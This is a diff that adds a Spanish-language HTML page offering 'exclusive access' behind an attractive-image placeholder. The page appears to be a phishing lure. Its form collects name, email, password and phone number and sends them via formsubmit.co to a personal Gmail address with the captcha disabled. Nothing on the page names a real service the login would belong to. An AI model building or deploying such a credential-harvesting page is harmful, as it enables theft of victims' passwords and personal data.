@@ -1,0 +1,79 @@
+Registro.html
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Formulario Especial</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(to right, #ff416c, #ff4b2b);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #ffffff;
+            border-radius: 15px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .container img {
+            width: 100%;
+            height: auto;
+        }
+        .form-container {
+            padding: 20px;
+        }
+        .form-container h2 {
+            color: #333333;
+            margin-bottom: 15px;
+        }
+        .form-container input, 
+        .form-container select {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #cccccc;
+            border-radius: 8px;
+            font-size: 16px;
+            background-color: #f9f9f9;
+        }
+        .form-container button {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            background-color: #ff416c;
+            color: #ffffff;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .form-container button:hover {
+            background-color: #ff4b2b;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.imgur.com/YOUR_IMAGE_ID.jpg" alt="Imagen atractiva">
+        <div class="form-container">
+            <h2>Acceso Exclusivo</h2>
+            <form action="https://formsubmit.co/antony20cv@gmail.com" method="POST">
+                <input type="text" name="nombre" placeholder="Nombre completo" required>
+                <input type="email" name="email" placeholder="Correo electrónico" required>
+                <input type="password" name="contraseña" placeholder="Contraseña" required>
+                <input type="tel" name="telefono" placeholder="Número de celular" required>
+                <button type="submit">Acceder</button>
+                <input type="hidden" name="_captcha" value="false">
+            </form>
+        </div>
+    </div>
+</body>
+</html>
